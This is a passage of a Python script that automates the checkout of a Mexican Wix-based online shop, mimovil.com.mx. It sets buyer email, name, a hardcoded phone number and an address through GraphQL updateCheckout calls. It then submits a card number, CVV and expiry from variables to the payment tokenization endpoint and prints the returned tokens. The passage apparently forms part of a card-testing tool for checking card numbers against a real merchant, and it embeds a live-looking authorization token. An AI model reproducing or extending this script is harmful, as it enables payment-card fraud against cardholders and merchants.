ExtendedFields on WixCommonDataDataextensionsExtendedFields {\n  namespaces\n}\n\nfragment CustomSettings on EcomCheckoutV1CustomSettings {\n  lockGiftCard\n  lockCouponCode\n  disabledManualPayment\n  disabledPolicyAgreementCheckbox\n}\n\nfragment SubscriptionCharge on EcomCheckoutV1Charge {\n  cycleBillingDate\n  cycleCount\n  cycleFrom\n  priceSummary {\n    ...PriceSummary\n  }\n}\n\nfragment SubscriptionCharges on EcomCheckoutV1SubscriptionCharges {\n  charges {\n    ...SubscriptionCharge\n  }\n  description\n  lineItemIds\n}\n\nfragment Checkout on EcomCheckoutV1Checkout {\n  id\n  lineItems {\n    ...LineItem\n  }\n  billingInfo {\n    ...AddressWithContactNoGeo\n  }\n  shippingInfo {\n    ...ShippingInfo\n  }\n  buyerNote\n  buyerInfo {\n    ...BuyerInfo\n  }\n  conversionCurrency\n  priceSummary {\n    ...PriceSummary\n  }\n  calculationErrors {\n    ...CalculationErrors\n  }\n  giftCard {\n    ...GiftCard\n  }\n  appliedDiscounts {\n    ...AppliedDiscount\n  }\n  customFields {\n    ...CustomField\n  }\n  weightUnit\n  taxSummary {\n    ...TaxSummary\n  }\n  currency\n  paymentCurrency\n  channelType\n  siteLanguage\n  buyerLanguage\n  completed\n  taxIncludedInPrice\n  createdBy {\n    ...CreatedBy\n  }\n  createdDate\n  updatedDate\n  payNow {\n    ...PriceSummary\n  }\n  payLater {\n    ...PriceSummary\n  }\n  payAfterFreeTrial {\n    ...PriceSummary\n  }\n  membershipOptions {\n    ...MembershipOptions\n  }\n  additionalFees {\n    ...AdditionalFee\n  }\n  cartId\n  conversionInfo {\n    ...ConversionInfo\n  }\n  payNowTotalAfterGiftCard {\n    ...MultiCurrencyPrice\n  }\n  purchaseFlowId\n  calculationErrors {\n    ...CalculationErrors\n  }\n  externalEnrichedLineItems {\n    enrichedLineItems {\n      ...EnrichedLineItem\n    }\n  }\n  violations {\n    ...Violation\n  }\n  totalAfterGiftCard {\n    ...MultiCurrencyPrice\n  }\n  extendedFields {\n    ...ExtendedFields\n  }\n  customSettings {\n    ...CustomSettings\n  }\n  subscriptionCharges {\n    ...SubscriptionCharges\n  }\n  paymentRequired\n  taxIncludedInPrice\n  lineItemsSubtotal {\n    ...MultiCurrencyPrice\n  }\n}',
                'variables': {
                    'input': {
                        'checkout': {
                            'id': checkout_id,
                            'buyerInfo': {
                                'email': correo_seleccionado,
                            },
                            'shippingInfo': {
                                'shippingDestination': {
                                    'contactDetails': {
                                        'firstName': name,
                                        'lastName': last,
                                        'phone': '9971556986',
                                    },
                                },
                            },
                        },
                        'fieldMask': [
                            'shippingInfo.shippingDestination.contactDetails',
                            'buyerInfo.email',
                            'shippingInfo.shippingDestination.addressesServiceId',
                        ],
                    },
                },
                'operationName': 'updateCheckout',
            }

            response = c.post('https://www.mimovil.com.mx/graphql-server/graphql', headers=headers, json=json_data)


            headers = {
                'Accept': 'application/json, text/plain, */*',
                'Referer': 'https://www.mimovil.com.mx/_partials/wix-thunderbolt/dist/clientWorker.df1ff4c9.bundle.min.js',
                'commonConfig': '%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%2237991cfa-b4d1-4379-8c05-5c408436628a%7C7%22%2C%22siteRevision%22%3A%223278%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D',
                'x-wix-brand': 'wix',
                'authorization': 'EU_vv3no7ULofjmt9ucGgw-7Nz3Z7cXR04lyY2_hgug.eyJpbnN0YW5jZUlkIjoiMmIxYTk2ZDgtYTllMi00NDA5LWFmMjEtNmUyZDcxYzJkMzNlIiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiYzRmMzA1ZGMtOGYxNS00MGNlLTlmNDEtOTNlNWZmZjg4NTQ2Iiwic2lnbkRhdGUiOiIyMDI1LTA4LTI3VDE3OjAzOjExLjM3MFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJhaWQiOiI5NTZiYmZhNi0zYTU2LTQ2ZjctOTA5Ni0xODMwYWI2MmExYWMiLCJiaVRva2VuIjoiZWZlOTkzMDQtMjZmNy0wNGM3LTMwNjAtZmRjODhlM2E1Njc4Iiwic2l0ZU93bmVySWQiOiI5MDlhNjdkMS03NmRkLTQ2YjctYjJiYS1kNTNkMWIxNmYyZjYiLCJzY2QiOiIyMDI0LTAxLTI0VDIyOjM0OjU2LjUwMFoifQ',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
            }

            json_data = {
                'query': 'mutation updateCheckout($input: EcomCheckoutV1UpdateCheckoutRequestInput!) {\n  checkoutMutation: ecomCheckoutV1UpdateCheckout(input: $input) {\n    checkout {\n      ...Checkout\n    }\n  }\n}\n\nfragment CatalogReference on ComWixEcommerceCatalogSpiApiV1CatalogReference {\n  catalogItemId\n  appId\n  options\n}\n\nfragment ProductName on ComWixEcommerceCatalogSpiApiV1ProductName {\n  original\n  translated\n}\n\nfragment PageUrlV2 on WixCommonPageUrlV2 {\n  relativePath\n  url\n}\n\nfragment MultiCurrencyPrice on ComWixEcommercePlatformCommonApiMultiCurrencyPrice {\n  amount\n  convertedAmount\n  formattedAmount\n  formattedConvertedAmount\n}\n\nfragment TaxRateBreakdown on ComWixEcomTotalsCalculatorV1TaxRateBreakdown {\n  name\n  rate\n  tax {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment ItemTaxFullDetails on ComWixEcomTotalsCalculatorV1ItemTaxFullDetails {\n  taxableAmount {\n    ...MultiCurrencyPrice\n  }\n  taxGroupId\n  taxRate\n  totalTax {\n    ...MultiCurrencyPrice\n  }\n  rateBreakdown {\n    ...TaxRateBreakdown\n  }\n  exemptAmount {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment DescriptionLineName on ComWixEcommerceCatalogSpiApiV1DescriptionLineName {\n  original\n  translated\n}\n\nfragment PlainTextValue on ComWixEcommerceCatalogSpiApiV1PlainTextValue {\n  original\n  translated\n}\n\nfragment Color on ComWixEcommerceCatalogSpiApiV1Color {\n  original\n  translated\n  code\n}\n\nfragment DescriptionLine on ComWixEcommerceCatalogSpiApiV1DescriptionLine {\n  name {\n    ...DescriptionLineName\n  }\n  lineType\n  plainText {\n    ...PlainTextValue\n  }\n  colorInfo {\n    ...Color\n  }\n  plainTextValue {\n    ...PlainTextValue\n  }\n  color\n}\n\nfragment Image on WixCommonImage {\n  id\n  url\n  height\n  width\n  altText\n  urlExpirationDate\n  filename\n  sizeInBytes\n}\n\nfragment ItemAvailabilityInfo on EcomCheckoutV1ItemAvailabilityInfo {\n  status\n  quantityAvailable\n}\n\nfragment PhysicalProperties on ComWixEcommerceCatalogSpiApiV1PhysicalProperties {\n  weight\n  sku\n  shippable\n}\n\nfragment Group on WixCouponsApiV2ScopeGroup {\n  name\n  entityId\n}\n\nfragment Scope on WixCouponsApiV2Scope {\n  namespace\n  group {\n    ...Group\n  }\n}\n\nfragment ItemType on ComWixEcommerceCatalogSpiApiV1ItemType {\n  preset\n  custom\n}\n\nfragment FreeTrialPeriod on ComWixEcommerceCatalogSpiApiV1FreeTrialPeriod {\n  interval\n  frequency\n}\n\nfragment SubscriptionSettings on ComWixEcommerceCatalogSpiApiV1SubscriptionSettings {\n  frequency\n  interval\n  autoRenewal\n  billingCycles\n  startDate\n  freeTrialPeriod {\n    ...FreeTrialPeriod\n  }\n}\n\nfragment Title on ComWixEcommerceCatalogSpiApiV1Title {\n  original\n  translated\n}\n\nfragment Description on ComWixEcommerceCatalogSpiApiV1Description {\n  original\n  translated\n}\n\nfragment SubscriptionOptionInfo on ComWixEcommerceCatalogSpiApiV1SubscriptionOptionInfo {\n  subscriptionSettings {\n    ...SubscriptionSettings\n  }\n  title {\n    ...Title\n  }\n  description {\n    ...Description\n  }\n}\n\nfragment SecuredMedia on ComWixEcommerceCatalogSpiApiV1SecuredMedia {\n  id\n  fileName\n  fileType\n}\n\nfragment ServiceProperties on ComWixEcommerceCatalogSpiApiV1ServiceProperties {\n  scheduledDate\n  numberOfParticipants\n}\n\nfragment PriceDescription on ComWixEcommerceCatalogSpiApiV1PriceDescription {\n  original\n  translated\n}\n\nfragment Policy on ComWixEcommerceCatalogSpiApiV1Policy {\n  title\n  content\n}\n\nfragment ModifierGroupName on ComWixEcommercePlatformCommonApiTranslatableString {\n  original\n  translated\n}\n\nfragment ModifierLabel on ComWixEcommercePlatformCommonApiTranslatableString {\n  original\n  translated\n}\n\nfragment ModifierDetails on ComWixEcommercePlatformCommonApiTranslatableString {\n  original\n  translated\n}\n\nfragment Modifier on ComWixEcomCartCheckoutCommonApiV1ItemModifier {\n  id\n  quantity\n  price {\n    ...MultiCurrencyPrice\n  }\n  label {\n    ...ModifierLabel\n  }\n  details {\n    ...ModifierDetails\n  }\n}\n\nfragment ModifierGroup on ComWixEcomCartCheckoutCommonApiV1ModifierGroup {\n  id\n  name {\n    ...ModifierGroupName\n  }\n  modifiers {\n    ...Modifier\n  }\n}\n\nfragment LineItem on EcomCheckoutV1LineItem {\n  id\n  quantity\n  catalogReference {\n    ...CatalogReference\n  }\n  productName {\n    ...ProductName\n  }\n  url {\n    ...PageUrlV2\n  }\n  price {\n    ...MultiCurrencyPrice\n  }\n  lineItemPrice {\n    ...MultiCurrencyPrice\n  }\n  fullPrice {\n    ...MultiCurrencyPrice\n  }\n  priceBeforeDiscounts {\n    ...MultiCurrencyPrice\n  }\n  totalPriceAfterTax {\n    ...MultiCurrencyPrice\n  }\n  totalPriceBeforeTax {\n    ...MultiCurrencyPrice\n  }\n  modifiersTotalPrice {\n    ...MultiCurrencyPrice\n  }\n  taxDetails {\n    ...ItemTaxFullDetails\n  }\n  discount {\n    ...MultiCurrencyPrice\n  }\n  descriptionLines {\n    ...DescriptionLine\n  }\n  media {\n    ...Image\n  }\n  availability {\n    ...ItemAvailabilityInfo\n  }\n  physicalProperties {\n    ...PhysicalProperties\n  }\n  couponScopes {\n    ...Scope\n  }\n  itemType {\n    ...ItemType\n  }\n  subscriptionOptionInfo {\n    ...SubscriptionOptionInfo\n  }\n  fulfillerId\n  shippingGroupId\n  digitalFile {\n    ...SecuredMedia\n  }\n  paymentOption\n  serviceProperties {\n    ...ServiceProperties\n  }\n  rootCatalogItemId\n  priceDescription {\n    ...PriceDescription\n  }\n  depositAmount {\n    ...MultiCurrencyPrice\n  }\n  policies {\n    ...Policy\n  }\n  consentRequiredPaymentPolicy\n  savePaymentMethod\n  priceUndetermined\n  fixedQuantity\n  membersOnly\n  deliveryProfileId\n  modifierGroups {\n    ...ModifierGroup\n  }\n}\n\nfragment StreetAddress on WixCommonStreetAddress {\n  number\n  name\n  apt\n  formattedAddressLine\n}\n\nfragment ApiAddressNoGeo on ComWixEcommercePlatformCommonApiAddress {\n  country\n  subdivision\n  city\n  postalCode\n  addressLine\n  addressLine2\n  countryFullname\n  subdivisionFullname\n  streetAddress {\n    ...StreetAddress\n  }\n}\n\nfragment VatId on WixCommonVatId {\n  id\n  type\n}\n\nfragment FullAddressContactDetails on ComWixEcommercePlatformCommonApiFullAddressContactDetails {\n  firstName\n  lastName\n  phone\n  company\n  vatId {\n    ...VatId\n  }\n}\n\nfragment AddressWithContactNoGeo on EcomCheckoutV1AddressWithContact {\n  address {\n    ...ApiAddressNoGeo\n  }\n  contactDetails {\n    ...FullAddressContactDetails\n  }\n  addressesServiceId\n}\n\nfragment GeoCode on WixCommonAddressLocation {\n  latitude\n  longitude\n}\n\nfragment ApiAddress on ComWixEcommercePlatformCommonApiAddress {\n  ...ApiAddressNoGeo\n  geocode {\n    ...GeoCode\n  }\n}\n\nfragment AddressWithContact on EcomCheckoutV1AddressWithContact {\n  address {\n    ...ApiAddress\n  }\n  contactDetails {\n    ...FullAddressContactDetails\n  }\n  addressesServiceId\n}\n\nfragment PickupDetails on ComWixEcomTotalsCalculatorV1PickupDetails {\n  address {\n    ...ApiAddress\n  }\n  businessLocation\n  pickupMethod\n}\n\nfragment DeliveryLogistics on ComWixEcomTotalsCalculatorV1DeliveryLogistics {\n  deliveryTime\n  instructions\n  pickupDetails {\n    ...PickupDetails\n  }\n  deliveryTimeSlot {\n    from\n    to\n  }\n}\n\nfragment SelectedCarrierServiceOptionPrices on ComWixEcomTotalsCalculatorV1SelectedCarrierServiceOptionPrices {\n  totalPriceAfterTax {\n    ...MultiCurrencyPrice\n  }\n  totalPriceBeforeTax {\n    ...MultiCurrencyPrice\n  }\n  taxDetails {\n    ...ItemTaxFullDetails\n  }\n  totalDiscount {\n    ...MultiCurrencyPrice\n  }\n  price {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment SelectedCarrierServiceOptionOtherCharge on ComWixEcomTotalsCalculatorV1SelectedCarrierServiceOptionOtherCharge {\n  type\n  details\n  cost {\n    ...SelectedCarrierServiceOptionPrices\n  }\n}\n\nfragment SelectedCarrierServiceOption on ComWixEcomTotalsCalculatorV1SelectedCarrierServiceOption {\n  code\n  title\n  logistics {\n    ...DeliveryLogistics\n  }\n  cost {\n    ...SelectedCarrierServiceOptionPrices\n  }\n  requestedShippingOption\n  otherCharges {\n    ...SelectedCarrierServiceOptionOtherCharge\n  }\n  carrierId\n}\n\nfragment ShippingRegion on ComWixEcomTotalsCalculatorV1ShippingRegion {\n  id\n  name\n}\n\nfragment OtherCharge on ComWixEcomTotalsCalculatorV1OtherCharge {\n  type\n  price {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment ShippingPrice on ComWixEcomTotalsCalculatorV1ShippingPrice {\n  price {\n    ...MultiCurrencyPrice\n  }\n  otherCharges {\n    ...OtherCharge\n  }\n}\n\nfragment ShippingOption on ComWixEcomTotalsCalculatorV1ShippingOption {\n  code\n  title\n  partial\n  logistics {\n    ...DeliveryLogistics\n  }\n  cost {\n    ...ShippingPrice\n  }\n}\n\nfragment CarrierServiceOption on ComWixEcomTotalsCalculatorV1CarrierServiceOption {\n  carrierId\n  shippingOptions {\n    ...ShippingOption\n  }\n}\n\nfragment ShippingInfo on EcomCheckoutV1ShippingInfo {\n  shippingDestination {\n    ...AddressWithContact\n  }\n  selectedCarrierServiceOption {\n    ...SelectedCarrierServiceOption\n  }\n  region {\n    ...ShippingRegion\n  }\n  carrierServiceOptions {\n    ...CarrierServiceOption\n  }\n}\n\nfragment BuyerInfo on EcomCheckoutV1BuyerInfo {\n  contactId\n  email\n  visitorId\n  memberId\n  openAccess\n}\n\nfragment PriceSummary on ComWixEcomTotalsCalculatorV1PriceSummary {\n  subtotal {\n    ...MultiCurrencyPrice\n  }\n  shipping {\n    ...MultiCurrencyPrice\n  }\n  tax {\n    ...MultiCurrencyPrice\n  }\n  discount {\n    ...MultiCurrencyPrice\n  }\n  total {\n    ...MultiCurrencyPrice\n  }\n  additionalFees {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment ApplicationError on WixApiApplicationError {\n  code\n  description\n  data\n}\n\nfragment FieldViolation on WixApiValidationErrorFieldViolation {\n  field\n  description\n  violatedRule\n  ruleName\n  data\n}\n\nfragment ValidationError on WixApiValidationError {\n  fieldViolations {\n    ...FieldViolation\n  }\n}\n\nfragment ErrorDetails on WixApiDetails {\n  applicationError {\n    ...ApplicationError\n  }\n  validationError {\n    ...ValidationError\n  }\n  tracing\n}\n\nfragment CarrierError on ComWixEcomTotalsCalculatorV1CarrierError {\n  carrierId\n  error {\n    ...ErrorDetails\n  }\n}\n\nfragment CarrierErrors on ComWixEcomTotalsCalculatorV1CarrierErrors {\n  errors {\n    ...CarrierError\n  }\n}\n\nfragment CalculationErrors on ComWixEcomTotalsCalculatorV1CalculationErrors {\n  generalShippingCalculationError {\n    ...ErrorDetails\n  }\n  carrierErrors {\n    ...CarrierErrors\n  }\n  taxCalculationError {\n    ...ErrorDetails\n  }\n  couponCalculationError {\n    ...ErrorDetails\n  }\n  giftCardCalculationError {\n    ...ErrorDetails\n  }\n  membershipError {\n    ...ErrorDetails\n  }\n  discountsCalculationError {\n    ...ErrorDetails\n  }\n  orderValidationErrors {\n    ...ApplicationError\n  }\n}\n\nfragment GiftCard on ComWixEcomTotalsCalculatorV1GiftCard {\n  id\n  obfuscatedCode\n  amount {\n    ...MultiCurrencyPrice\n  }\n  appId\n}\n\nfragment Coupon on ComWixEcomTotalsCalculatorV1Coupon {\n  id\n  code\n  amount {\n    ...MultiCurrencyPrice\n  }\n  name\n  couponType\n}\n\nfragment MerchantDiscount on ComWixEcomTotalsCalculatorV1MerchantDiscount {\n  amount {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment DiscountRuleName on ComWixEcomTotalsCalculatorV1DiscountRuleName {\n  original\n  translated\n}\n\nfragment DiscountRule on ComWixEcomTotalsCalculatorV1DiscountRule {\n  id\n  name {\n    ...DiscountRuleName\n  }\n  amount {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment AppliedDiscount on ComWixEcomTotalsCalculatorV1AppliedDiscount {\n  discountType\n  lineItemIds\n  coupon {\n    ...Coupon\n  }\n  merchantDiscount {\n    ...MerchantDiscount\n  }\n  discountRule {\n    ...DiscountRule\n  }\n}\n\nfragment CustomField on ComWixEcomOrdersV1CustomField {\n  value\n  title\n  translatedTitle\n}\n\nfragment AutoTaxFallbackCalculationDetails on ComWixEcomTaxApiAutoTaxFallbackCalculationDetails {\n  fallbackReason\n  error {\n    ...ApplicationError\n  }\n}\n\nfragment TaxCalculationDetails on ComWixEcomTaxApiTaxCalculationDetails {\n  rateType\n  manualRateReason\n  autoTaxFallbackDetails {\n    ...AutoTaxFallbackCalculationDetails\n  }\n}\n\nfragment AggregatedTaxBreakdown on ComWixEcomTotalsCalculatorV1AggregatedTaxBreakdown {\n  taxName\n  aggregatedTaxAmount {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment TaxSummary on ComWixEcomTotalsCalculatorV1TaxSummary {\n  taxableAmount {\n    ...MultiCurrencyPrice\n  }\n  totalTax {\n    ...MultiCurrencyPrice\n  }\n  manualTaxRate\n  calculationDetails {\n    ...TaxCalculationDetails\n  }\n  taxEstimationId\n  averageTaxRate\n  totalExempt {\n    ...MultiCurrencyPrice\n  }\n  aggregatedTaxBreakdown {\n    ...AggregatedTaxBreakdown\n  }\n}\n\nfragment CreatedBy on EcomCheckoutV1CreatedBy {\n  userId\n  memberId\n  visitorId\n  appId\n}\n\nfragment MembershipName on ComWixEcomMembershipsSpiV1MembershipName {\n  original\n  translated\n}\n\nfragment MembershipPaymentCredits on ComWixEcomMembershipsSpiV1MembershipPaymentCredits {\n  total\n  remaining\n}\n\nfragment Membership on ComWixEcomMembershipsSpiV1HostMembership {\n  id\n  appId\n  name {\n    ...MembershipName\n  }\n  lineItemIds\n  credits {\n    ...MembershipPaymentCredits\n  }\n  expirationDate\n  additionalData\n}\n\nfragment InvalidMembership on ComWixEcomMembershipsSpiV1HostInvalidMembership {\n  membership {\n    ...Membership\n  }\n  reason\n}\n\nfragment SelectedMembership on ComWixEcomMembershipsSpiV1HostSelectedMembership {\n  id\n  appId\n  lineItemIds\n}\n\nfragment MembershipOptions on EcomCheckoutV1MembershipOptions {\n  eligibleMemberships {\n    ...Membership\n  }\n  invalidMemberships {\n    ...InvalidMembership\n  }\n  selectedMemberships {\n    memberships {\n      ...SelectedMembership\n    }\n  }\n}\n\nfragment AdditionalFee on ComWixEcomTotalsCalculatorV1AdditionalFee {\n  code\n  name\n  translatedName\n  price {\n    ...MultiCurrencyPrice\n  }\n  taxDetails {\n    ...ItemTaxFullDetails\n  }\n  providerAppId\n  priceBeforeTax {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment ConversionInfo on EcomCheckoutV1ConversionInfo {\n  siteCurrency\n  conversionRate\n}\n\nfragment RenderingConfig on ComWixEcomLineItemsEnricherSpiApiV1LineItemRenderingConfig {\n  hidePrice\n  hideQuantity\n}\n\nfragment EnrichedLineItem on ComWixEcomLineItemsEnricherSpiApiV1EnrichedLineItem {\n  id\n  overriddenDescriptionLines {\n    descriptionLines {\n      ...DescriptionLine\n    }\n  }\n  renderingConfig {\n    ...RenderingConfig\n  }\n}\n\nfragment ViolationLineItemTarget on ComWixEcommerceValidationsSpiV1TargetLineItem {\n  id\n  name\n  suggestedFix\n}\n\nfragment ViolationOtherTarget on ComWixEcommerceValidationsSpiV1TargetOther {\n  name\n}\n\nfragment ViolationTarget on ComWixEcommerceValidationsSpiV1Target {\n  lineItem {\n    ...ViolationLineItemTarget\n  }\n  other {\n    ...ViolationOtherTarget\n  }\n}\n\nfragment Violation on ComWixEcommerceValidationsSpiV1Violation {\n  severity\n  target {\n    ...ViolationTarget\n  }\n  description\n}\n\nfragment ExtendedFields on WixCommonDataDataextensionsExtendedFields {\n  namespaces\n}\n\nfragment CustomSettings on EcomCheckoutV1CustomSettings {\n  lockGiftCard\n  lockCouponCode\n  disabledManualPayment\n  disabledPolicyAgreementCheckbox\n}\n\nfragment SubscriptionCharge on EcomCheckoutV1Charge {\n  cycleBillingDate\n  cycleCount\n  cycleFrom\n  priceSummary {\n    ...PriceSummary\n  }\n}\n\nfragment SubscriptionCharges on EcomCheckoutV1SubscriptionCharges {\n  charges {\n    ...SubscriptionCharge\n  }\n  description\n  lineItemIds\n}\n\nfragment Checkout on EcomCheckoutV1Checkout {\n  id\n  lineItems {\n    ...LineItem\n  }\n  billingInfo {\n    ...AddressWithContactNoGeo\n  }\n  shippingInfo {\n    ...ShippingInfo\n  }\n  buyerNote\n  buyerInfo {\n    ...BuyerInfo\n  }\n  conversionCurrency\n  priceSummary {\n    ...PriceSummary\n  }\n  calculationErrors {\n    ...CalculationErrors\n  }\n  giftCard {\n    ...GiftCard\n  }\n  appliedDiscounts {\n    ...AppliedDiscount\n  }\n  customFields {\n    ...CustomField\n  }\n  weightUnit\n  taxSummary {\n    ...TaxSummary\n  }\n  currency\n  paymentCurrency\n  channelType\n  siteLanguage\n  buyerLanguage\n  completed\n  taxIncludedInPrice\n  createdBy {\n    ...CreatedBy\n  }\n  createdDate\n  updatedDate\n  payNow {\n    ...PriceSummary\n  }\n  payLater {\n    ...PriceSummary\n  }\n  payAfterFreeTrial {\n    ...PriceSummary\n  }\n  membershipOptions {\n    ...MembershipOptions\n  }\n  additionalFees {\n    ...AdditionalFee\n  }\n  cartId\n  conversionInfo {\n    ...ConversionInfo\n  }\n  payNowTotalAfterGiftCard {\n    ...MultiCurrencyPrice\n  }\n  purchaseFlowId\n  calculationErrors {\n    ...CalculationErrors\n  }\n  externalEnrichedLineItems {\n    enrichedLineItems {\n      ...EnrichedLineItem\n    }\n  }\n  violations {\n    ...Violation\n  }\n  totalAfterGiftCard {\n    ...MultiCurrencyPrice\n  }\n  extendedFields {\n    ...ExtendedFields\n  }\n  customSettings {\n    ...CustomSettings\n  }\n  subscriptionCharges {\n    ...SubscriptionCharges\n  }\n  paymentRequired\n  taxIncludedInPrice\n  lineItemsSubtotal {\n    ...MultiCurrencyPrice\n  }\n}',
                'variables': {
                    'input': {
                        'checkout': {
                            'id': checkout_id,
                            'billingInfo': {
                                'contactDetails': {
                                    'firstName': name,
                                    'lastName': last,
                                    'phone': '09971556986',
                                },
                                'address': {
                                    'country': 'MX',
                                    'city': 'Teabo',
                                    'subdivision': 'MX-YUC',
                                    'postalCode': '97910',
                                    'addressLine': 'calle o242',
                                },
                            },
                        },
                        'fieldMask': [
                            'billingInfo.contactDetails',
                            'billingInfo.address',
                        ],
                    },
                },
                'operationName': 'updateCheckout',
            }

            response = c.post('https://www.mimovil.com.mx/graphql-server/graphql', headers=headers, json=json_data)



            headers = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'es-ES,es;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Origin': 'https://cashier-pci.wixapps.net',
                'Pragma': 'no-cache',
                'Referer': 'https://cashier-pci.wixapps.net/card-form?locale=es&providerId=com.stripe&parentOrigin=https%3A%2F%2Fwww.mimovil.com.mx&startLoadTime=1756314249871&msid=c4f305dc-8f15-40ce-9f41-93e5fff88546&visitorId=956bbfa6-3a56-46f7-9096-1830ab62a1ac&siteOwnerId=909a67d1-76dd-46b7-b2ba-d53d1b16f2f6&theme=minimal',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'X-Wix-Client-Artifact-Id': 'payments-cc-form',
                'authorization': 'EU_vv3no7ULofjmt9ucGgw-7Nz3Z7cXR04lyY2_hgug.eyJpbnN0YW5jZUlkIjoiMmIxYTk2ZDgtYTllMi00NDA5LWFmMjEtNmUyZDcxYzJkMzNlIiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiYzRmMzA1ZGMtOGYxNS00MGNlLTlmNDEtOTNlNWZmZjg4NTQ2Iiwic2lnbkRhdGUiOiIyMDI1LTA4LTI3VDE3OjAzOjExLjM3MFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJhaWQiOiI5NTZiYmZhNi0zYTU2LTQ2ZjctOTA5Ni0xODMwYWI2MmExYWMiLCJiaVRva2VuIjoiZWZlOTkzMDQtMjZmNy0wNGM3LTMwNjAtZmRjODhlM2E1Njc4Iiwic2l0ZU93bmVySWQiOiI5MDlhNjdkMS03NmRkLTQ2YjctYjJiYS1kNTNkMWIxNmYyZjYiLCJzY2QiOiIyMDI0LTAxLTI0VDIyOjM0OjU2LjUwMFoifQ',
                'commonconfig': '%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%2237991cfa-b4d1-4379-8c05-5c408436628a%7C7%22%2C%22siteRevision%22%3A%223278%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'x-wix-brand': 'wix',
            }

            json_data = {
                'cvv': cvv,
                'creditCard': {
                    'number': cc_number,
                    'expiration': {
                        'month': mes,
                        'year': ano_number,
                    },
                    'additionalInformation': {
                        'holderName': f'{name} {last}',
                    },
                    'billingAddress': {},
                },
            }

            response = c.post(
                'https://cashier-pci.wixapps.net/_api/payment-gateway-web/tokenize/v2/tokens',
                headers=headers,
                json=json_data,
            )

            responsePm = json.loads(response.text)
            token = responsePm.get("token", {}).get("token")
            token_security = responsePm.get("token", {}).get("securityCodeToken")
            print(token)
            print(token_security)

            headers = {
                'authority': 'www.mimovil.com.mx',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'EU_vv3no7ULofjmt9ucGgw-7Nz3Z7cXR04lyY2_hgug.eyJpbnN0YW5jZUlkIjoiMmIxYTk2ZDgtYTllMi00NDA5LWFmMjEtNmUyZDcxYzJkMzNlIiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiYzRmMzA1ZGMtOGYxNS00MGNlLTlmNDEtOTNlNWZmZjg4NTQ2Iiwic2lnbkRhdGUiOiIyMDI1LTA4LTI3VDE3OjAzOjExLjM3MFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJhaWQiOiI5NTZiYmZhNi0zYTU2LTQ2ZjctOTA5Ni0xODMwYWI2MmExYWMiLCJiaVRva2VuIjoiZWZlOTkzMDQtMjZmNy0wNGM3LTMwNjAtZmRjODhlM2E1Njc4Iiwic2l0ZU93bmVySWQiOiI5MDlhNjdkMS03NmRkLTQ2YjctYjJiYS1kNTNkMWIxNmYyZjYiLCJzY2QiOiIyMDI0LTAxLTI0VDIyOjM0OjU2LjUwMFoifQ',
                'cache-control': 'no-cache',
                'commonconfig': '%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%2237991cfa-b4d1-4379-8c05-5c408436628a%7C7%22%2C%22siteRevision%22%3A%223278%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D',
                'content-type': 'application/json',
